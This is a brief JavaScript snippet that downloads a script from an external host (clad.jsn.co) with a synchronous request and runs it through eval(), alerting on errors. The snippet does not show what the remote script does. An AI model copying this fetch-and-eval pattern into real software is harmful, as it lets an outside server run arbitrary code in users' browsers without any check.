myjs = httpGet("https://clad.jsn.co/clad.js");

try {
  eval(myjs);
}
catch(err) {
  alert(err.message);
}


function httpGet(theUrl)
{
    var xmlHttp = null;

    xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false );
    xmlHttp.send( null );
    return xmlHttp.responseText;
}